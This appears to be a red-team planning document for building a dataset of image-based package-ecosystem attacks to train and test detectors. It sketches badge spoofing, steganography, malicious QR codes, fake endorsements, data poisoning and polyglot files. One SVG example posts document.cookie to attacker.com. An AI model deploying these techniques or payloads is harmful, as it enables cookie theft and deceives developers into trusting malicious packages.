# Manual Red Teaming: Novel Image-based Attack Scenarios

## Philosophy

**Synthetic data is not enough.** We need to manually craft realistic, novel attacks that:
1. Actually work in real package ecosystems
2. Bypass existing detection mechanisms
3. Represent genuine attacker creativity
4. Test edge cases and blind spots

## Red Team Approach

### Goal
Create **50-100 manually crafted attack scenarios** that represent realistic, sophisticated threats.

### Principles
- **Realistic**: Could actually be deployed by attackers
- **Novel**: Not just variations of known attacks
- **Subtle**: Hard to detect with simple heuristics
- **Effective**: Would actually deceive users/systems

## Attack Scenario Categories

### Category 1: Sophisticated Badge Manipulation (15 scenarios)

#### Scenario 1.1: Homograph Badge URLs
**Attack**: Use Unicode homographs in badge URLs
```python
# Looks like: https://github.com/user/repo
# Actually: https://github.com/user/repο  (Greek omicron)

def create_homograph_badge():
    legitimate_url = "https://github.com/django/django"
    # Replace 'o' with Greek omicron (ο)
    homograph_url = "https://github.com/djangο/djangο"
    
    badge = create_badge_image(
        text="Build: Passing",
        url=homograph_url,
        style="legitimate_github_style"
    )
    return badge
```

**Why it works**: Visually identical, bypasses URL string matching

#### Scenario 1.2: Subdomain Confusion
**Attack**: Use legitimate domain as subdomain
```python
# Looks legitimate: github.com appears in URL
# Actually malicious: github.com.evil-domain.com

badge_url = "https://api.github.com.attacker-cdn.ru/badge.svg"
```

**Why it works**: Users see "github.com" and trust it

#### Scenario 1.3: Expired Certificate Badge
**Attack**: Show "security verified" badge for package with expired cert
```python
def create_misleading_security_badge(package):
    # Package actually has expired/invalid certificate
    # But badge shows "Security: A+"
    
    actual_cert_status = check_certificate(package.url)  # EXPIRED
    badge_text = "Security: A+ ✓"  # Misleading
    
    return create_badge(badge_text, color="green")
```

**Why it works**: Users trust visual indicators over checking certs

#### Scenario 1.4: Fake Dependency Count
**Attack**: Inflate dependency count to appear popular
```python
# Real dependents: 12
# Badge shows: 12,000+ dependents

badge = create_badge(
    text="Used by: 12K+ projects",
    actual_count=12,
    inflated_count=12000
)
```

**Why it works**: Social proof manipulation

#### Scenario 1.5: Outdated Vulnerability Badge
**Attack**: Show "No vulnerabilities" badge but data is 2 years old
```python
badge = create_badge(
    text="Vulnerabilities: 0",
    last_checked="2022-01-01",  # 2 years ago
    display_date=False  # Hide staleness
)
```

**Why it works**: Users assume badges are current

### Category 2: Advanced Steganography (20 scenarios)

#### Scenario 2.1: Multi-layer Steganography
**Attack**: Hide payload in multiple image layers
```python
def multi_layer_stego(clean_image):
    # Layer 1: LSB steganography (decoy)
    layer1 = lsb.hide(clean_image, "innocent_message")
    
    # Layer 2: DCT-based steganography (actual payload)
    layer2 = dct_hide(layer1, "malicious_payload")
    
    # Layer 3: Metadata injection
    layer3 = inject_exif_payload(layer2, "command_and_control_url")
    
    return layer3
```

**Why it works**: Detection tools find layer 1, miss layers 2-3

#### Scenario 2.2: Conditional Steganography
**Attack**: Payload only visible under specific conditions
```python
def conditional_stego(image, trigger_condition):
    # Payload only extractable if:
    # - Image viewed at specific resolution
    # - Specific color profile applied
    # - Viewed on specific OS
    
    if trigger_condition == "windows_dark_mode":
        payload = extract_payload(image)
    else:
        payload = None  # Appears clean
    
    return payload
```

**Why it works**: Evades sandbox analysis

#### Scenario 2.3: Polyglot Image Files
**Attack**: File is both valid image AND executable
```python
# File header: Valid PNG
# File footer: Valid ZIP with malware
# Middle: Steganographic payload

def create_polyglot():
    png_data = create_valid_png()
    zip_data = create_malicious_zip()
    
    polyglot = png_data + zip_data
    # Valid as both PNG and ZIP
    
    return polyglot
```

**Why it works**: Image viewers show image, extractors find malware

#### Scenario 2.4: Semantic Steganography
**Attack**: Hide payload in image semantics, not bits
```python
def semantic_stego(logo_image):
    # Encode message in visual elements:
    # - Number of stars in logo = command ID
    # - Color gradient = encryption key
    # - Shape orientation = target URL
    
    stars_count = 7  # Command: download_and_execute
    gradient_angle = 45  # Key: 0x2D
    shape_rotation = 90  # URL: bit.ly/xyz
    
    return create_logo_with_semantics(stars_count, gradient_angle, shape_rotation)
```

**Why it works**: No bit-level steganography, pure visual encoding

#### Scenario 2.5: Time-based Steganography
**Attack**: Payload changes over time
```python
def time_based_stego(image_url):
    # Image served from attacker CDN
    # Payload changes based on request time
    
    if datetime.now().hour == 3:  # 3 AM
        return image_with_payload()
    else:
        return clean_image()
```

**Why it works**: Analysis tools check once, miss time-variant payload

### Category 3: Malicious QR Codes (10 scenarios)

#### Scenario 3.1: QR Code with Delayed Redirect
**Attack**: QR code redirects to legitimate site first, then malicious
```python
def delayed_redirect_qr():
    # QR contains: https://attacker.com/redirect?to=github.com/project
    # First visit: Redirects to legitimate GitHub
    # Subsequent visits: Redirects to phishing site
    
    qr_url = "https://attacker.com/smart-redirect"
    return qrcode.make(qr_url)
```

**Why it works**: Initial scan appears safe

#### Scenario 3.2: QR Code with Geofencing
**Attack**: QR code behavior depends on location
```python
def geofenced_qr():
    # If scanned in US: Legitimate site
    # If scanned in other countries: Malicious site
    
    qr_url = "https://attacker.com/geo-aware-redirect"
    return qrcode.make(qr_url)
```

**Why it works**: Evades US-based security analysis

#### Scenario 3.3: Partial QR Code
**Attack**: QR code split across multiple images
```python
def split_qr_code():
    # README.md has 3 images
    # Each contains 1/3 of QR code
    # Combined: Complete malicious QR
    
    full_qr = qrcode.make("https://malicious.com")
    part1, part2, part3 = split_image(full_qr, 3)
    
    return [part1, part2, part3]
```

**Why it works**: Individual parts appear innocent

#### Scenario 3.4: QR Code in Logo
**Attack**: Embed scannable QR in package logo
```python
def qr_in_logo(logo_design):
    # Logo appears normal
    # But contains scannable QR code in pattern
    
    qr_data = "https://malicious.com"
    logo_with_qr = embed_qr_in_design(logo_design, qr_data)
    
    # Looks like decorative pattern
    # Actually scannable QR code
    
    return logo_with_qr
```

**Why it works**: Doesn't look like QR code

#### Scenario 3.5: Dynamic QR Code
**Attack**: QR code image changes based on user agent
```python
def dynamic_qr(user_agent):
    # If user_agent == "security_scanner":
    #     return clean_qr
    # else:
    #     return malicious_qr
    
    if "bot" in user_agent.lower():
        return qrcode.make("https://legitimate.com")
    else:
        return qrcode.make("https://malicious.com")
```

**Why it works**: Evades automated scanning

### Category 4: Visual Social Engineering (15 scenarios)

#### Scenario 4.1: Fake Maintainer Endorsement
**Attack**: Screenshot of fake GitHub discussion
```python
def fake_endorsement_screenshot():
    # Create realistic GitHub discussion screenshot
    # Shows "Linus Torvalds" endorsing the package
    # Actually fabricated image
    
    screenshot = create_fake_github_discussion(
        participants=["torvalds", "guido", "other_famous_devs"],
        content="This package is amazing! Highly recommended.",
        stars=50000,
        forks=10000
    )
    
    return screenshot
```

**Why it works**: Users trust authority figures

#### Scenario 4.2: Fake Security Audit Report
**Attack**: Professional-looking security audit PDF screenshot
```python
def fake_audit_report():
    # Create screenshot of fake audit report
    # Looks like professional security firm
    # Shows "No vulnerabilities found"
    
    report = create_fake_pdf_screenshot(
        company="TrustSec Security (fake)",
        logo="professional_looking_logo.png",
        conclusion="Comprehensive audit: No issues found",
        date="2024-10-01"
    )
    
    return report
```

**Why it works**: Professional appearance = trust

#### Scenario 4.3: Fake Download Statistics
**Attack**: Manipulated PyPI/npm statistics screenshot
```python
def fake_download_stats():
    # Screenshot of PyPI stats page
    # Shows 10M downloads/month
    # Actually has 100 downloads/month
    
    screenshot = create_fake_pypi_stats(
        package_name="malicious-package",
        downloads_per_month=10000000,  # Fake
        actual_downloads=100  # Real
    )
    
    return screenshot
```

**Why it works**: Social proof manipulation

#### Scenario 4.4: Fake Comparison Chart
**Attack**: Biased comparison chart favoring malicious package
```python
def fake_comparison_chart():
    # Chart comparing malicious package vs. legitimate alternatives
    # Shows malicious package as superior in all metrics
    
    chart = create_comparison_chart(
        packages=["malicious-pkg", "legitimate-pkg-1", "legitimate-pkg-2"],
        metrics=["Speed", "Security", "Features", "Support"],
        # Malicious package scores inflated
        scores={
            "malicious-pkg": [10, 10, 10, 10],
            "legitimate-pkg-1": [5, 6, 5, 7],
            "legitimate-pkg-2": [6, 5, 6, 6]
        }
    )
    
    return chart
```

**Why it works**: Visual data appears objective

#### Scenario 4.5: Fake Vulnerability Disclosure Timeline
**Attack**: Show fake timeline of "responsible disclosure"
```python
def fake_disclosure_timeline():
    # Image showing timeline:
    # "Vulnerability found → Reported → Fixed → Disclosed"
    # Implies package has good security practices
    # Actually, no vulnerability ever existed
    
    timeline = create_timeline_image([
        "2024-01-15: Vulnerability discovered",
        "2024-01-16: Reported to maintainers",
        "2024-01-20: Patch released (v1.2.3)",
        "2024-02-15: Public disclosure (CVE-2024-XXXX)"
    ])
    
    return timeline
```

**Why it works**: Shows "responsible" security practices

### Category 5: Adversarial ML Attacks (10 scenarios)

#### Scenario 5.1: Adversarial Perturbations on Badges
**Attack**: Add imperceptible noise to make badge undetectable
```python
def adversarial_badge(clean_badge, detector_model):
    # Add minimal noise to evade detection
    
    perturbation = fgsm_attack(
        image=clean_badge,
        model=detector_model,
        epsilon=0.01  # Imperceptible
    )
    
    adversarial_badge = clean_badge + perturbation
    
    # Looks identical to humans
    # Detector classifies as "legitimate"
    
    return adversarial_badge
```

**Why it works**: Exploits ML model vulnerabilities

#### Scenario 5.2: Model Poisoning via Package Images
**Attack**: Contribute poisoned images to training datasets
```python
def poison_training_data():
    # If detector uses community-contributed data
    # Submit "legitimate" images with subtle backdoor
    
    poisoned_images = []
    for i in range(100):
        img = create_legitimate_looking_image()
        # Add trigger pattern (e.g., small logo in corner)
        img = add_trigger_pattern(img, pattern="small_star")
        poisoned_images.append(img)
    
    # When detector sees trigger pattern, misclassifies
    
    return poisoned_images
```

**Why it works**: Backdoor in detection model

#### Scenario 5.3: Adversarial Examples for OCR
**Attack**: Make text in image unreadable by OCR but readable by humans
```python
def ocr_evasion_text(malicious_text):
    # Text: "Download malware from evil.com"
    # OCR reads: "Download software from github.com"
    # Humans read: "Download malware from evil.com"
    
    adversarial_text_image = create_text_image(
        text=malicious_text,
        font_perturbation=True,  # Confuses OCR
        human_readable=True
    )
    
    return adversarial_text_image
```

**Why it works**: Exploits OCR weaknesses

### Category 6: Novel Attack Vectors (10 scenarios)

#### Scenario 6.1: Animated GIF with Hidden Frame
**Attack**: Malicious content in single frame of GIF
```python
def malicious_gif():
    # GIF with 100 frames
    # Frame 1-99: Innocent animation
    # Frame 100: QR code to malicious site (1ms duration)
    
    frames = [create_innocent_frame() for _ in range(99)]
    malicious_frame = create_qr_code("https://malicious.com")
    frames.append(malicious_frame)
    
    gif = create_gif(frames, duration=[100]*99 + [1])  # Last frame 1ms
    
    return gif
```

**Why it works**: Too fast for human perception, but scannable

#### Scenario 6.2: SVG with Embedded JavaScript
**Attack**: SVG image with malicious script
```python
def malicious_svg():
    svg = """
    <svg xmlns="http://www.w3.org/2000/svg">
        <image href="logo.png" />
        <script>
            // Malicious JavaScript
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: document.cookie
            });
        </script>
    </svg>
    """
    return svg
```

**Why it works**: SVG can contain executable code

#### Scenario 6.3: CSS Injection via Image
**Attack**: Image filename contains CSS injection
```python
def css_injection_image():
    # Filename: "logo.png?style=<style>body{display:none}</style>"
    # When rendered in markdown: Injects CSS
    
    filename = "logo.png?style=<style>@import url('https://attacker.com/steal.css')</style>"
    
    return filename
```

**Why it works**: Markdown renderers may not sanitize

#### Scenario 6.4: Unicode Art Payload
**Attack**: Use Unicode characters to create visual payload
```python
def unicode_art_payload():
    # Looks like decorative ASCII art
    # Actually encodes malicious URL
    
    art = """
    ╔═══════════════════╗
    ║  SECURE PACKAGE   ║
    ║  ✓ Verified       ║
    ╚═══════════════════╝
    """
    
    # But Unicode characters encode: "evil.com/malware"
    # Decoded by custom script
    
    return art
```

**Why it works**: Appears decorative, actually functional

#### Scenario 6.5: Favicon as Attack Vector
**Attack**: Malicious favicon in package documentation
```python
def malicious_favicon():
    # Documentation site has custom favicon
    # Favicon is actually malicious
    
    favicon = create_ico_file(
        visible_icon="innocent_logo.png",
        hidden_payload="malware.exe"  # Polyglot ICO/EXE
    )
    
    return favicon
```

**Why it works**: Favicons rarely analyzed

## Red Team Execution Plan

### Phase 1: Scenario Development (Week 1-2)
- [ ] Develop 50 detailed attack scenarios
- [ ] Document each with code, rationale, detection challenges
- [ ] Categorize by sophistication level

### Phase 2: Implementation (Week 3-4)
- [ ] Implement each attack scenario
- [ ] Create actual malicious images (in isolated environment)
- [ ] Test effectiveness against existing tools

### Phase 3: Validation (Week 5-6)
- [ ] Test if attacks bypass current detection
- [ ] Measure human detection rate (user study)
- [ ] Document which attacks are most effective

### Phase 4: Dataset Creation (Week 7-8)
- [ ] Create sanitized versions for training
- [ ] Label with attack type and sophistication
- [ ] Document detection strategies

## Ethical Guidelines

### DO:
- Create attacks in isolated environment
- Document for defensive purposes
- Share with security community responsibly
- Use for training detection models

### DON'T:
- Deploy attacks in real package ecosystems
- Share attack code publicly without mitigation
- Use for malicious purposes
- Test on production systems without permission

## Expected Outcomes

### Dataset Quality
- **50-100 realistic attack scenarios**
- **High sophistication**: Novel, not just variations
- **Diverse**: Cover multiple attack vectors
- **Validated**: Proven to bypass existing detection

### Research Value
- **Novel attack taxonomy**: Categorize image-based attacks
- **Detection challenges**: Identify blind spots
- **Mitigation strategies**: Develop countermeasures
- **Benchmark**: Standard for evaluating detectors

## Comparison: Synthetic vs. Red Team

| Aspect | Synthetic Data | Red Team Attacks |
|--------|----------------|------------------|
| **Quantity** | 16,500 | 50-100 |
| **Quality** | Low (simple variations) | High (sophisticated) |
| **Realism** | Medium | Very High |
| **Novelty** | Low | High |
| **Cost** | $0 | $0 (time investment) |
| **Value for Training** | Baseline patterns | Edge cases |
| **Value for Evaluation** | Low | High |

### Recommended Strategy
1. **Synthetic data**: Train baseline model (quantity)
2. **Red team attacks**: Evaluate and improve (quality)
3. **Combination**: Best of both worlds

## Next Steps

1. **This week**: Develop 10 attack scenarios in detail
2. **Next week**: Implement and test 10 scenarios
3. **Week 3**: Expand to 50 scenarios
4. **Week 4**: Validate effectiveness
5. **Month 2**: Use for model evaluation and improvement

---

**Conclusion**: Manual red teaming provides the high-quality, realistic attack scenarios needed to train and evaluate effective detection systems. Synthetic data provides quantity, red team provides quality.
